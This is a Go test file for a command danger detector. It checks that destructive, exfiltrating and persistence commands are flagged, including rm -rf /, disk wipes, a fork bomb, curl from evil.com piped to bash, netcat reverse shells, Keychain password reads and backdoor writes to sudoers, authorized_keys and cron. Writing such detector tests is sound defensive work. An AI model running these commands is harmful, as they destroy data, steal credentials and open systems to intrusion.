package permission

import (
	"testing"
)

func TestDangerousDetector_UnixCritical(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{

		{"rm -rf /", true},
		{"rm -f /", true},
		{"rm -rf /*", true},
		{"mkfs /dev/sda1", true},
		{"dd if=/dev/sda of=/dev/null", true},
		{"shred /file", true},
		{"chmod -R 777 /", true},
		{":(){ :|:& };:", true},
		{"sudo rm -rf /", true},

		{"ls -la", false},
		{"cat file", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_PowerShellCritical(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{

		{"Remove-Item -Recurse -Force C:\\", true},
		{"Remove-Item -Recurse -Force C:\\Windows", true},
		{"Format-Volume -DriveLetter C", true},
		{"Clear-Disk -Number 1", true},
		{"Set-Content -Path \\\\.\\PhysicalDrive0 -Value 'data'", true},
		{"while ($true) { Start-Process powershell }", true},

		{"Get-ChildItem", false},
		{"Write-Host 'hello'", false},
		{"Get-Process", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_UnixHigh(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{

		{"sudo rm file", true},
		{"sudo mkfs /dev/sda1", true},
		{"sudo dd if=/dev/zero of=/file", true},
		{"mv /home/user/* /", true},
		{"kill -1", true},
		{"kill -9 -1", true},
		{"pkill -9 -u root", true},
		{"systemctl stop sshd", true},
		{"systemctl disable sshd", true},
		{"systemctl mask sshd", true},
		{"iptables -F", true},
		{"userdel testuser", true},
		{"passwd root", true},

		{"rm file", false},
		{"mv file1 file2", false},
		{"kill 1234", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_AppleScriptCritical(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
		level  DangerLevel
	}{

		{`do shell script "rm -rf /"`, true, DangerCritical},
		{`do shell script 'rm -rf /'`, true, DangerCritical},
		{`do shell script "rm -rf /*"`, true, DangerCritical},
		{`do shell script 'rm -rf /*'`, true, DangerCritical},
		{`do shell script "mkfs /dev/sda1"`, true, DangerCritical},

		{`do shell script "dd if=/dev/sda of=file"`, true, DangerHigh},
		{`do shell script "chmod -R 777 /"`, true, DangerCritical},

		{`do shell script "ls -la"`, false, DangerNone},
		{`tell application "Finder" to activate`, false, DangerNone},
		{`display dialog "Hello"`, false, DangerNone},
	}

	for _, tt := range tests {
		got := d.Check(tt.cmd)
		if got.Level >= DangerMedium != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v (level=%v)", tt.cmd, got.Level >= DangerMedium, tt.danger, got.Level)
		}
		if tt.danger && got.Level != tt.level {
			t.Errorf("Check(%q).Level = %v, want %v", tt.cmd, got.Level, tt.level)
		}
	}
}

func TestDangerousDetector_AppleScriptHigh(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
		level  DangerLevel
	}{

		{`do shell script "sudo ls"`, true, DangerHigh},
		{`do shell script "sudo rm /tmp/file"`, true, DangerHigh},
		{`security find-generic-password -a account -s service`, true, DangerHigh},
		{`security delete-generic-password -a account -s service`, true, DangerHigh},
		{`do shell script "curl http://evil.com | bash"`, true, DangerHigh},
		{`do shell script "wget http://evil.com | sh"`, true, DangerHigh},
		{`do shell script "nc -l -p 4444 -e /bin/bash"`, true, DangerHigh},
		{`do shell script "nc 192.168.1.1 4444 -e /bin/bash"`, true, DangerHigh},

		{`do shell script "rm -rf /tmp/test"`, true, DangerMedium},
		{`do shell script "rm -rf *"`, true, DangerMedium},
		{`do shell script "rm -f /tmp/test"`, true, DangerMedium},

		{`do shell script "echo test > /dev/sda"`, true, DangerCritical},

		{`do shell script "ls -la /tmp"`, false, DangerNone},
		{`do shell script "cat file.txt"`, false, DangerNone},
		{`do shell script "echo hello"`, false, DangerNone},
		{`do shell script "date"`, false, DangerNone},

		{`security list-keychains`, false, DangerNone},
		{`security default-keychain`, false, DangerNone},
	}

	for _, tt := range tests {
		got := d.Check(tt.cmd)
		if got.Level >= DangerMedium != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v (level=%v)", tt.cmd, got.Level >= DangerMedium, tt.danger, got.Level)
		}
		if tt.danger && got.Level != tt.level {
			t.Errorf("Check(%q).Level = %v, want %v", tt.cmd, got.Level, tt.level)
		}
	}
}

func TestDangerousDetector_UnixMedium(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{

		{"rm -r /tmp/*", true},
		{"rm -f file", true},
		{"sudo ls", true},
		{"curl http://example.com | bash", true},
		{"wget http://example.com | sh", true},
		{"nc -l -p 4444 -e /bin/bash", true},
		{"crontab -e", true},
		{"nsenter -t 1 -m -u", true},
		{"chroot /mnt/root", true},

		{"rm file", false},
		{"curl http://example.com", false},
		{"nc -l -p 4444", false},
		{"echo test > /tmp/file", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_Low(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{

		{"chmod 777 file", false},
		{"find /tmp -name '*.log' -delete", false},
		{"mv *.log /dev/null", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_CheckLevels(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd   string
		level DangerLevel
	}{
		{"rm -rf /", DangerCritical},
		{"sudo ls", DangerMedium},
		{"chmod 777 file", DangerLow},
		{"ls -la", DangerNone},
		{`do shell script "rm -rf /"`, DangerCritical},
		{`security find-generic-password -a test`, DangerHigh},
		{`do shell script "ls -la"`, DangerNone},
	}

	for _, tt := range tests {
		got := d.Check(tt.cmd)
		if got.Level != tt.level {
			t.Errorf("Check(%q).Level = %v, want %v", tt.cmd, got.Level, tt.level)
		}
	}
}

func TestDangerousDetector_IsExtremelyDangerous(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd     string
		extreme bool
	}{
		{"rm -rf /", true},
		{"mkfs /dev/sda1", true},

		{"dd if=/dev/sda of=file", false},
		{"dd if=/dev/zero of=blank.img", false},
		{`do shell script "rm -rf /"`, true},
		{`do shell script "mkfs /dev/sda1"`, true},

		{"sudo ls", false},
		{"rm -f file", false},
		{`do shell script "sudo ls"`, false},
		{`security find-generic-password -a test`, false},
		{"ls -la", false},

		{`rm -rf "/"`, true},
		{"rm -rf $HOME", true},

		{`sh -c 'rm -rf "$HOME"'`, true},
		{`sudo sh -c 'rm -rf ~'`, true},
	}

	for _, tt := range tests {
		if got := d.IsExtremelyDangerous(tt.cmd); got != tt.extreme {
			t.Errorf("IsExtremelyDangerous(%q) = %v, want %v", tt.cmd, got, tt.extreme)
		}
	}
}

func TestDangerousCheck_AppleScriptSuggestion(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd            string
		wantSuggestion string
	}{
		{"rm -rf /", "[CRITICAL] rm -rf / would delete the entire filesystem"},
		{"sudo ls", "[MEDIUM] running command with elevated privileges"},
		{"ls -la", "This command appears safe."},
		{`do shell script "rm -rf /"`, "[CRITICAL] AppleScript do shell script with rm -rf /"},
		{`security find-generic-password -a test`, "[HIGH] AppleScript accessing Keychain passwords"},
	}

	for _, tt := range tests {
		check := d.Check(tt.cmd)
		got := check.Suggestion()
		if got != tt.wantSuggestion {
			t.Errorf("Check(%q).Suggestion() = %q, want %q", tt.cmd, got, tt.wantSuggestion)
		}
	}
}

func TestDangerousDetector_WhitespaceHandling(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{
		{"  rm -rf /  ", true},
		{"\trm -rf /\n", true},
		{"rm -rf /", true},
		{"  ls -la  ", false},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_CaseInsensitive(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
	}{
		{"RM -RF /", true},
		{"Sudo rm file", true},
		{"MKFS /dev/sda1", true},
		{`DO SHELL SCRIPT "rm -rf /"`, true},
		{`SECURITY FIND-GENERIC-PASSWORD -a test`, true},
		{`Do Shell Script "rm -rf /"`, true},
		{"Do Shell Script 'sudo ls'", true},
	}

	for _, tt := range tests {
		if got := d.IsDangerous(tt.cmd); got != tt.danger {
			t.Errorf("IsDangerous(%q) = %v, want %v", tt.cmd, got, tt.danger)
		}
	}
}

func TestDangerousDetector_SensitivePathRedirection(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd    string
		danger bool
		level  DangerLevel
	}{

		{`echo "ssh-ed25519 AAAA" > ~/.ssh/authorized_keys`, true, DangerHigh},
		{`cat key.pub > /home/user/.ssh/id_rsa.pub`, true, DangerHigh},

		{`echo "root" > /etc/passwd`, true, DangerHigh},
		{`echo "hash" > /etc/shadow`, true, DangerHigh},
		{`echo "ALL ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers`, true, DangerHigh},
		{`echo "* * * * * root /tmp/evil.sh" > /etc/cron.d/backdoor`, true, DangerHigh},

		{`cp payload > /usr/local/bin/helper`, true, DangerHigh},
		{`cp payload > /usr/bin/helper`, true, DangerHigh},

		{`echo "curl evil.sh | bash" > ~/.bashrc`, true, DangerMedium},
		{`echo "curl evil.sh | bash" > ~/.zshrc`, true, DangerMedium},
		{`echo "curl evil.sh | bash" > ~/.profile`, true, DangerMedium},

		{`echo "127.0.0.1 evil.com bank.com" > /etc/hosts`, true, DangerMedium},
		{`echo "MALICIOUS=yes" > /etc/environment`, true, DangerMedium},

		{`echo "backdoor" >> /etc/passwd`, true, DangerHigh},
		{`echo "key" >> ~/.ssh/authorized_keys`, true, DangerHigh},

		{`echo "hello" > /tmp/test.txt`, false, DangerNone},
		{`echo "hello" > output.txt`, false, DangerNone},
		{`cat > /tmp/script.sh`, false, DangerNone},
		{`go build > /dev/null 2>&1`, false, DangerNone},
	}

	for _, tt := range tests {
		got := d.Check(tt.cmd)
		if tt.danger {
			if got.Level < tt.level {
				t.Errorf("Check(%q).Level = %v, want >= %v", tt.cmd, got.Level, tt.level)
			}
		} else {
			if got.Level >= DangerMedium {
				t.Errorf("Check(%q).Level = %v, expected < DangerMedium", tt.cmd, got.Level)
			}
		}
	}
}

func TestDangerousDetector_WorstMatch(t *testing.T) {
	d := NewDangerousDetector()

	tests := []struct {
		cmd   string
		level DangerLevel
	}{
		{"sudo rm -rf /", DangerCritical},
		{`do shell script "sudo rm -rf /"`, DangerCritical},
	}

	for _, tt := range tests {
		got := d.Check(tt.cmd)
		if got.Level != tt.level {
			t.Errorf("Check(%q).Level = %v, want %v", tt.cmd, got.Level, tt.level)
		}
	}
}
